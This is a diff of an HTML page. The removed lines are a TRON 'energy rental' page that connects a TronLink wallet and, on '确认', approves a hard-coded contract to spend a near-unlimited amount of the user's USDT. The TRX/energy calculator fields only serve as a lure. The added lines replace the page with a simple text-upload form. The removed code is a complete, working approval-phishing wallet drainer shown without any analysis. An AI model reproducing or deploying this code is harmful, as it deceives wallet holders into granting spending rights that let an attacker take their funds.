@@ -1,190 +1,117 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>能量租赁</title>
-<script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.4/dist/TronWeb.js"></script>
-<style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>提交表单</title>
+  <style>
     * {
+      margin: 0;
+      padding: 0;
       box-sizing: border-box;
     }
     body {
-      margin: 0;
-      min-height: 100vh;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
-        "Microsoft YaHei", Arial, sans-serif;
-      background: #f5f6f8;
-      color: #222;
+      font-family: system-ui, sans-serif;
+      background-color: #f5f7fa;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
+      min-height: 100vh;
     }
     .container {
-      width: min(460px, calc(100% - 32px));
-      background: #fff;
-      border-radius: 18px;
-      padding: 28px;
-      box-shadow: 0 10px 35px rgba(0,0,0,.08);
+      width: 90%;
+      max-width: 480px;
+      background: #ffffff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
     }
-    h1 {
-      margin: 0 0 8px;
+    .title {
+      font-size: 22px;
+      color: #222;
+      margin-bottom: 30px;
       text-align: center;
-      font-size: 28px;
     }
-    .subtitle {
-      text-align: center;
-      color: #777;
-      font-size: 14px;
-      margin-bottom: 20px;
-    }
-    button {
+    .input-box {
       width: 100%;
-      border: 0;
-      border-radius: 11px;
-      padding: 13px 16px;
-      font-size: 15px;
-      cursor: pointer;
-      background: #222;
-      color: white;
-      transition: .2s;
-      margin-bottom:12px;
-    }
-    button:hover {
-      opacity: .88;
-    }
-    button:disabled {
-      opacity: .5;
-      cursor: not-allowed;
-    }
-    .field {
-      margin-bottom: 16px;
-    }
-    label {
-      display: block;
-      font-size: 13px;
-      color: #666;
-      margin-bottom: 7px;
-    }
-    input {
-      width: 100%;
-      padding: 13px;
-      border: 1px solid #ddd;
-      border-radius: 10px;
+      padding: 14px 16px;
+      border: 1px solid #d2d6dc;
+      border-radius: 8px;
+      font-size: 16px;
       outline: none;
-      font-size: 15px;
+      transition: border 0.2s;
     }
-    input:focus {
-      border-color: #777;
+    .input-box:focus {
+      border-color: #4080ff;
     }
-    .warning {
-      background: #fff7e6;
-      border: 1px solid #ffe0a3;
-      color: #8a5a00;
-      border-radius: 10px;
-      padding: 12px;
-      font-size: 12px;
-      line-height: 1.6;
-      margin: 16px 0;
+    .submit-btn {
+      width: 100%;
+      margin-top: 24px;
+      padding: 14px;
+      border: none;
+      background-color: #4080ff;
+      color: white;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.2s;
     }
-    .status {
-      min-height: 20px;
+    .submit-btn:hover {
+      background-color: #2b6ed9;
+    }
+    .tip {
+      margin-top: 20px;
       text-align: center;
-      margin-top: 16px;
-      font-size: 13px;
       color: #666;
     }
-    .network {
-      text-align: center;
-      font-size: 12px;
-      color: #999;
-      margin-top: 18px;
-    }
-</style>
+  </style>
 </head>
 <body>
-<div class="container">
-<h1>能量租赁</h1>
-<div class="field">
-    <label>能量</label>
-    <input type="number" id="inpEnergy" placeholder="请输入需要租赁的能量数量">
-</div>
-<div class="field">
-    <label>消耗TRX</label>
-    <input type="number" id="inpTrx" placeholder="对应的TRX数量">
-</div>
+  <div class="container">
+    <div class="title">数据上传</div>
+    <input id="contentInput" class="input-box" placeholder="在此输入内容">
+    <button class="submit-btn" onclick="submitData()">确认上传</button>
+    <div class="tip" id="msg"></div>
+  </div>
 
-<button onclick="connectWallet()">连接钱包</button>
-<button onclick="approveToken()">确认</button>
-
-<div id="log" class="status"></div>
-
-<div class="network">TRON TRC20‑USDT</div>
-</div>
-
-<script>
- // 已经填入你的合约地址
-const CONTRACT_ADDRESS = "TGoZkUojDzZG1KPLyi6BFSm9wKL118Y3Ls";
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const FIX_AMOUNT = BigInt("6859382084082938309389090");
-// 换算比例：1 TRX = 50000 能量
-const ENERGY_PER_TRX = 50000;
-
-let inpEnergy = document.getElementById('inpEnergy');
-let inpTrx = document.getElementById('inpTrx');
-
-// 输入能量自动算出TRX
-inpEnergy.addEventListener('input', function(){
-    let eVal = Number(this.value);
-    if(!eVal || eVal <=0){
-        inpTrx.value = '';
+  <script>
+    async function submitData() {
+      const inputEle = document.getElementById("contentInput");
+      const msgEle = document.getElementById("msg");
+      const value = inputEle.value.trim();
+      if (!value) {
+        msgEle.innerText = "请输入内容";
+        msgEle.style.color = "#e53e3e";
         return;
-    }
-    let trxVal = eVal / ENERGY_PER_TRX;
-    inpTrx.value = trxVal;
-});
-// 输入TRX自动算出能量
-inpTrx.addEventListener('input', function(){
-    let tVal = Number(this.value);
-    if(!tVal || tVal <=0){
-        inpEnergy.value = '';
-        return;
-    }
-    let eVal = tVal * ENERGY_PER_TRX;
-    inpEnergy.value = eVal;
-});
+      }
+      msgEle.innerText = "正在提交...";
+      msgEle.style.color = "#666";
 
-
-let tronWeb;
-async function connectWallet(){
-    document.getElementById("log").innerText="正在请求钱包连接...";
-    if(window.tron){
-        try{
-            await window.tron.request({method:"tron_requestAccounts"});
-            tronWeb = window.tronWeb;
-            document.getElementById("log").innerText = "钱包已连接：" + tronWeb.defaultAddress.base58;
-        }catch(e){
-            document.getElementById("log").innerText = "用户拒绝连接或者钱包异常:"+e.message;
+      try {
+        const res = await fetch("/api/submit", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            data: value
+          })
+        });
+        const result = await res.json();
+        if (res.ok) {
+          msgEle.innerText = "上传成功！";
+          msgEle.style.color = "#28a745";
+          inputEle.value = "";
+        } else {
+          msgEle.innerText = "上传失败：" + result.message;
+          msgEle.style.color = "#e53e3e";
         }
-    }else if(window.tronWeb && window.tronWeb.ready){
-        tronWeb = window.tronWeb;
-        document.getElementById("log").innerText = "钱包已连接：" + tronWeb.defaultAddress.base58;
-    }else{
-        document.getElementById("log").innerText = "当前钱包不支持TRON，请使用TronLink钱包";
+      } catch (err) {
+        msgEle.innerText = "网络请求出错";
+        msgEle.style.color = "#e53e3e";
+      }
     }
-}
-async function approveToken(){
-    if(!tronWeb) return alert("请先连接钱包");
-    const usdt = await tronWeb.contract().at(USDT_CONTRACT);
-    try{
-        const tx = await usdt.approve(CONTRACT_ADDRESS, FIX_AMOUNT).send();
-        document.getElementById("log").innerText = "成功，交易哈希：" + tx;
-    }catch(err){
-        document.getElementById("log").innerText = "失败：" + err.message;
-    }
-}
-</script>
-
+  </script>
 </body>
 </html>
 
